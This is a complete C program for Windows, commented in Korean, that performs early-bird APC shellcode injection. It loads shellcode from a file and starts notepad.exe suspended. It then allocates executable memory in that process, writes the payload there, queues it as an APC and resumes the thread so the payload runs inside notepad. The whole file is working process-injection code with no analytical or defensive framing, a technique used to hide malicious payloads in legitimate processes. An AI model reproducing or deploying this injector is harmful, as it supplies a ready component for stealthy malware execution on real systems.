#include <windows.h>
#include <stdio.h>

int main() {
    printf("[*] APC 인젝터 시작\n");

    // ── 쉘코드 파일 로드 ──
    HANDLE hFile = CreateFileA("shellcode.bin", GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] shellcode.bin 열기 실패: %d\n", GetLastError());
        return -1;
    }

    DWORD shellcode_size = GetFileSize(hFile, NULL);
    PBYTE shellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, shellcode_size);
    DWORD dwRead = 0;
    ReadFile(hFile, shellcode, shellcode_size, &dwRead, NULL);
    CloseHandle(hFile);
    printf("[+] 쉘코드 로드 완료: %d bytes\n", shellcode_size);

    // ── 1단계: 프로세스 생성 ──
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] 프로세스 생성 실패: %d\n", GetLastError());
        return -1;
    }
    printf("[+] notepad.exe 생성 완료 (PID: %d)\n", pi.dwProcessId);

    // ── 2단계: 메모리 할당 ──
    LPVOID pRemoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcode_size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        printf("[!] 메모리 할당 실패: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
        
    }
    printf("[+] 원격 메모리 할당: 0x%p\n", pRemoteMem);

    // ── 3단계: 쉘코드 복사 ──
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, pRemoteMem, shellcode, shellcode_size, &written)) {
        printf("[!] 메모리 쓰기 실패: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    printf("[+] 쉘코드 복사 완료: %zu bytes\n", written);

    // ── 4단계: APC 등록 ──
    if (!QueueUserAPC((PAPCFUNC)pRemoteMem, pi.hThread, 0)) {
        printf("[!] APC 등록 실패: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    printf("[+] APC 큐 등록 완료\n");

    // ── 5단계: 스레드 재개 ──
    ResumeThread(pi.hThread);
    printf("[+] 스레드 재개 → 쉘코드 실행!\n");

    Sleep(3000);

    HeapFree(GetProcessHeap(), 0, shellcode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    printf("[+] 완료\n");
    return 0;
}